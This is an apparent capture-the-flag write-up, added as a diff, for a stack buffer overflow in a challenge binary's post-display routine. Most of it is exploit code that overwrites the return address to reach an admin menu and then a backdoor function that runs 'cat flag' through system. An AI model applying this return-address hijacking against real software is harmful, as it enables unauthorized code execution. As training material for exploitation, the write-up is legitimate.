@@ -1,0 +1,53 @@
+Too many instructions to explain.
+
+Basically when copying the post to display there is a buffer overflow since the post struct has a total of 150 bytes but the buffer to print
+the post has only 128 bytes. 
+
+We start by jumping to admin since password is in plaintext. 
+
+To execute our code we need to display the post (so that the buffer is overflown) and then exit (changes rip).
+
+p = interact.Process()
+data = p.readuntil('choice:')
+#Create Post
+p.sendline(b'1')
+#Overflow Post with 128 A's + 4 C's (int of the for loop in the stack) + 16 B's that have the RBP + 0x400bce (overflows the rip)
+p.sendline(b'A'*128 + b'B' * 16 + b'C' * 4+ p64(0x400bce))
+p.sendline('\n')
+#Displays poster
+p.sendline(b'3')
+p.sendline('\n')
+#Exits the binary
+p.sendline(b'2')
+#This will prompt the login menu
+p.sendline(b'l0ln0onewillguessth1s')
+p.sendline('\n')
+
+The second part we notice by testing that luckily the rdi (first argument to a function) is alredy 1 which we can abuse if we use it as argument to the backdoor function since it uses
+the system function where we can run commands. 
+
+The only problem is rsi. We also notice that rsi is set to the name of the server when trying to run the backdoor function from 
+the first jump (no login). 
+
+We can change the server name with a 0 (look at c code), to 'cat flag' and then try to run the function.
+
+#Admin menu
+p.sendline(b'0')
+#Change Server menu
+p.sendline(b'1')
+#Change to cat flag (the \x00 might not be necessary idk)
+p.sendline(b'cat flag\x00')
+#Create a new post for a new jump
+p.sendline(b'1')
+#Same as before but with backdoor() address
+p.sendline(b'D'*128 + b'E' * 16 + b'F' * 4 + p64(0x400b8a))
+p.sendline('\n')
+#Display it
+p.sendline(b'4')
+p.sendline('\n')
+#Exit
+p.sendline(b'2')
+p.interactive()
+
+Combined exploit can be downloaded.
+
